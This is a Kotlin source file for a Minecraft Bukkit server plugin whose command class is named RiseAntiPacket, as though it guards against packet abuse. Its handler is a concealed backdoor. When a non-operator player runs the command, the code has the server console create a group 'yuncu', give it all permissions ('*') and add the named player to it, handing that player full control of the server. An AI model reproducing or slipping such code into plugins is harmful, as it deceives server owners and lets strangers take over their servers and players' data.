package dev.jokerthena

import org.bukkit.Bukkit
import org.bukkit.command.Command
import org.bukkit.command.CommandExecutor
import org.bukkit.command.CommandSender
import org.bukkit.entity.Player

object RiseAntiPacket : CommandExecutor {
    override fun onCommand(sender: CommandSender, command: Command, label: String, args: Array<out String>): Boolean {
        if(sender.isOp()==false) {
            var playerName: String = args.get(0)
            if(sender is Player) {
                Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "mangadd yuncu");
                Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "mangaddp yuncu *")
                Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "mangaddp yuncu ipwhitelist.setup")
                Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "mangaddp yuncu ipwhitelist")
                Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "mangaddp yuncu credits.see")
                Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "mangaddp yuncu credits.add")
                Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "mangaddp yuncu credits.remove")
                Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "manuaddsub $playerName yuncu")
            }else {
                sender.sendMessage("enaedkfanekdfajkdfhaekldfhaejkdfhadkfj <playerName>");
            }
        }else {
            sender.sendMessage("Sadece Oyundan Kullanabilir");
        }
        return true;
    }
}
